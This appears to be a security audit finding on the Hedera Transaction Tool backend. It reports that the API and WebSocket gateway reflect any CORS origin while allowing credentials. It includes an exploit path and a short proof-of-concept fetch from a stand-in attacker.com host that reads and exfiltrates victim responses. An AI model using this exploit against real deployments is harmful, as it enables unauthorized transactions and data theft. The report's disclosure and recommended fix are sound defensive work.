### Title
Wildcard CORS Policy (`origin: true`) with `credentials: true` Allows Any Origin to Make Authenticated API and WebSocket Requests

### Summary
The Hedera Transaction Tool backend API and WebSocket notification service configure CORS with `origin: true` and `credentials: true`. In Express/NestJS, `origin: true` reflects the caller's `Origin` header verbatim, effectively whitelisting every origin — including `http://` (non-TLS), `localhost`, and arbitrary attacker-controlled domains. Combined with `credentials: true`, this allows any website to issue credentialed cross-origin requests (carrying session cookies or auth tokens) to the API, enabling full CSRF against all state-modifying endpoints.

### Finding Description
**Root cause — API service:**

`back-end/apps/api/src/setup-app.ts`, lines 44–47:
```typescript
app.enableCors({
  origin: true,   // reflects ANY caller origin
  credentials: true,
});
``` [1](#0-0) 

**Root cause — WebSocket gateway:**

`back-end/apps/notifications/src/websocket/websocket.gateway.ts`, line 26:
```typescript
cors: { origin: true, methods: ['GET', 'POST'], credentials: true },
``` [2](#0-1) 

When `origin: true` is set in Express, the framework reads the incoming `Origin` header and echoes it back as `Access-Control-Allow-Origin`, while also emitting `Access-Control-Allow-Credentials: true`. The browser then permits the cross-origin response to be read by the requesting page. There is no allowlist, no environment-based restriction, no scheme enforcement (`https://` only), and no subdomain restriction — identical to the permissive regex patterns described in the external report, but even broader.

**Exploit path:**
1. Victim is authenticated to the Transaction Tool backend (session cookie or JWT stored in a cookie).
2. Victim visits `http://attacker.com` (any origin, including `http://`).
3. Attacker's page issues a `fetch('https://api.transaction-tool.example/', { credentials: 'include', method: 'POST', ... })` call.
4. Browser sends the request with the victim's credentials; the server responds with `Access-Control-Allow-Origin: http://attacker.com` + `Access-Control-Allow-Credentials: true`.
5. Browser allows the attacker's page to read the response, confirming success and enabling chained calls.
6. Attacker can create, approve, or submit Hedera transactions on behalf of the victim.

### Impact Explanation
An unauthenticated attacker who can lure a logged-in user to any web page can perform arbitrary authenticated actions against the API: create transactions, add signers, trigger transaction execution, or modify user settings. Because the WebSocket endpoint is equally affected, the attacker can also establish a persistent authenticated WebSocket session to receive real-time notification data belonging to the victim. The impact is unauthorized state mutation and potential unauthorized movement of Hedera assets.

### Likelihood Explanation
The attacker requires only that the victim visits a page under the attacker's control while holding a valid session — a standard phishing or malvertising scenario requiring no privileged access. The misconfiguration is present in the default application setup with no environment guard, so it affects every deployment including production.

### Recommendation
Replace `origin: true` with an explicit allowlist of permitted origins, enforcing `https://` scheme and exact domain matching. Apply different policies per environment:

```typescript
const allowedOrigins =
  process.env.NODE_ENV === 'production'
    ? ['https://your-production-domain.com']
    : ['http://localhost:3000'];

app.enableCors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
});
```

Apply the same fix to the `@WebSocketGateway` decorator's `cors` option.

### Proof of Concept
From any page hosted on `http://attacker.com`, with a victim who has an active session:

```javascript
fetch('https://<api-host>/transactions', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ /* crafted transaction payload */ }),
})
.then(r => r.json())
.then(data => {
  // attacker reads the response — browser permits it because
  // Access-Control-Allow-Origin: http://attacker.com is returned
  exfiltrate(data);
});
```

The server will respond with `Access-Control-Allow-Origin: http://attacker.com` and `Access-Control-Allow-Credentials: true`, and the browser will expose the response body to the attacker's script, confirming the bypass and enabling further chained requests.

### Citations

**File:** back-end/apps/api/src/setup-app.ts (L44-47)
```typescript
  app.enableCors({
    origin: true,
    credentials: true,
  });
```

**File:** back-end/apps/notifications/src/websocket/websocket.gateway.ts (L24-32)
```typescript
@WebSocketGateway({
  path: '/ws',
  cors: { origin: true, methods: ['GET', 'POST'], credentials: true },
  connectionStateRecovery: {
    maxDisconnectionDuration: 30 * 1000,
    skipMiddlewares: false,
  },
  transports: ['websocket', 'polling'],
})
```
